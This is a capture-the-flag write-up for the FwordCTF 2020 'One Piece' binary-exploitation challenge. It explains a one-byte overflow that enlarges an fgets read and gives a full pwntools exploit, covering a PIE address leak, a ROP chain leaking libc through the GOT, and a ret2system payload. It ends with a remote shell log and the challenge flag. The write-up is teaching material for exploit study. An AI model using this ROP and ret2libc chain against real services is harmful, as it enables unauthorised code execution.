# FwordCTF 2020

## One Piece

> 478
> 
> Luffy has started learning Binary Exploitation recently. He sent me this binary and said that I have to find the One Piece. Can you help me ?
>
> `nc onepiece.fword.wtf 1238`
>
> Author : haflout
>
> [`One Piece`](one_piece)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_


## Summary

Exploit a BOF vulnerability to score a second BOF vulnerability. a.k.a. _Two Piece_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Most mitigations in place, however no stack canary; BOF -> ROP.

    
### Decompile with Ghidra

```c
undefined8 mugiwara(char *param_1)
{
  char *local_40;
  char local_38 [40];
  int local_10;
  uint local_c;
  
  local_10 = 0x28;
  printf("Luffy is amazing, right ? : %lx \n");
  local_c = 0;
  local_40 = param_1;
  while ((*local_40 != '\0' && (local_c < 0x28))) {
    local_38[(int)local_c] = *local_40;
    if (*local_40 == 'z') {
      local_c = local_c + 1;
      local_38[(int)local_c] = -0x77;
    }
    local_c = local_c + 1;
    local_40 = local_40 + 1;
  }
  puts("Wanna tell Luffy something ? : ");
  fgets(local_38,local_10,stdin);
  return 0;
}
```

The vulnerability is in the block `if (*local_40 == 'z') {` where `local_c` can get incremented without a check and overflow the buffer `local_38` into `local_10` (`local_10` is used to constrain `fgets`).  `local_10` is initialized to `0x28`, however if the last char is `z` and `local_c = 0x27`, then the value `-0x77` (`0x89`) will overwrite the lower 8-bits of `local_10`; `fgets` will then permit `0x89` characters of input into a buffer that is `0x38` (`local_38`) bytes from the return address in the stack creating a second BOF vulnerability.

Before any BOFing, `printf("Luffy is amazing, right ? : %lx \n");` leaks a `mugiwara` address that we can use to compute the base process address.  With that we can use the GOT to leak libc, and then get a shell.

Since the libc version is unknown, the first half of the exploit will have to be written and run against the challenge server to leak the version of libc used.


## Exploit

### Setup

> See [_Welcome Pwner Exploit Setup_](https://github.com/datajerk/ctf-write-ups/blob/master/fwordctf2020/welcome_pwner/README.md#setup) for a detailed explanation of why I start my exploits this way:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./one_piece')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.30-0ubuntu2.2_amd64'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.30.so')
libc = ELF(libpath + 'libc-2.30.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('onepiece.fword.wtf', 1238)
#'''
```

The setup above is the final version, but before we can get there, we'll start with our local libc block, then switch to the challenge libc after discovered.

### First Pass: get base process address and overflow `local_10`

```python
p.recvuntil('(menu)>>')
p.sendline('read')
p.recvuntil('>>')
p.send('y' * 0x27 + 'z')
p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('Luffy is amazing, right ? : ')
_ = p.recvline().strip()
mugiwara = (int(_,16) & (2**64 - 0x1000)) + binary.sym.mugiwara
log.info('mugiwara: ' + hex(mugiwara))
binary.address = mugiwara - binary.sym.mugiwara
log.info('binary.address: ' + hex(binary.address))
```

From the menu, `read` is used to fill the buffer with `0x27` `y`s and one `z`.  This will trigger the vulnerability and permit an `fgets` BOF when the secret word `gomugomunomi` (see `choice` decompilation) is entered from the menu.  A `mugiwara` address is also leaked; pick this up to compute the base process address.

### First Pass: BOF `fgets` to leak libc and ret to `choice`

```python
p.recvuntil('Wanna tell Luffy something ? : \n')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info('pop_rdi: ' + hex(pop_rdi))

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.choice)

p.sendline(payload)

_ = p.recv(6)
puts = u64(_ + b'\x00\x00')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

This is standard fare CTF GOT provided leakage.  IANS, having `puts` _put_ itself out there and _ret2choice_.

At this point however we still do not know the version of libc, we'll have to run this remotely and harvest the last 3 nibbles of the `puts` address to use the [libc-database](https://github.com/niklasb/libc-database) (example [here](https://github.com/datajerk/ctf-write-ups/blob/master/fwordctf2020/welcome_pwner/README.md#decompile-with-ghidra)).

After identifying `libc6_2.30-0ubuntu2.2_amd64` as the libc version, we can put that into the second block in the setup and switch to that for the rest of the exploit development.

> Don't forget to `./download libc6_2.30-0ubuntu2.2_amd64` from within the `libc-directory`.

### Second Pass: get a shell, get a flag

```python
p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('Wanna tell Luffy something ? : \n')

payload  = 0x38 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendline(payload)
p.interactive()
```

From `choice`, just use the secret word `gomugomunomi`, but this time the payload invokes `system` for a shell--_remotely_, not _locally_...

The second block in the setup while it allows using the challenge binary with the challenge libc on a system with a different native libc, it will not (in most cases), run `/bin/sh` from that system since the `LD_LIBRARY_PATH` is setup specifically for the challenge binary.  Most likely you'll get a segfault and it may be confusing as to why.  The segfault _is_ from the challenge binary, the `system` actually failed to run `/bin/sh` locally because of the aforementioned and continued execution of the program; and with an overflowed stack it is destined to segfault.

To confirm `system` actually did invoke I use gdb.  To do this I just put a `pause()` before the final `sendline` call, then connect with, gdb, e.g.:

```
gef one_piece $(pidof /pwd/datajerk/fwordctf2020/one_piece/libc-database/libs/libc6_2.30-0ubuntu2.2_amd64/ld-2.30.so)
```

> We're using the correct `ld` for the challenge `libc`, hence the _not-so-obvious_ `pidof` above.

From within gdb type:

```
gef➤  set follow-fork-mode child
gef➤  c
Continuing.
```

Then, back to `./exploit.py`, press Enter/Return to unpause, and then from the gdb session you should get:

```
[New process 26740]
process 26740 is executing new program: /bin/dash
```

That is evidence `system` worked.

> The `payload += p64(pop_rdi + 1)` fixes a [stack alignment](https://blog.binpang.me/2019/07/12/stack-alignment/) issue with `system`, `printf`, etc... sometimes you need it, other times you do not.  In this case it is needed with the remote server.

Now, just change the second block in the setup section to use the remote server and get the flag.

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/fwordctf2020/one_piece/one_piece'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/one_piece/libc-database/libs/libc6_2.30-0ubuntu2.2_amd64/ld-2.30.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/one_piece/libc-database/libs/libc6_2.30-0ubuntu2.2_amd64/libc-2.30.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to onepiece.fword.wtf on port 1238: Done
[*] mugiwara: 0x55ad7272d998
[*] binary.address: 0x55ad7272d000
[*] Loaded 14 cached gadgets for './one_piece'
[*] pop_rdi: 0x55ad7272dba3
[*] puts: 0x7fa3c865b490
[*] libc.address: 0x7fa3c85d4000
[*] Switching to interactive mode
$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 40
-rw-r--r-- 1 root root    28 Aug 29 01:09 flag.txt
-rwxrwxr-x 1 root root 13016 Aug 29 18:46 one_piece
-rwxr-xr-x 1 root root 18744 Aug 29 01:05 ynetd
$ cat flag.txt
FwordCTF{0nE_pi3cE_1s_Re4l}
```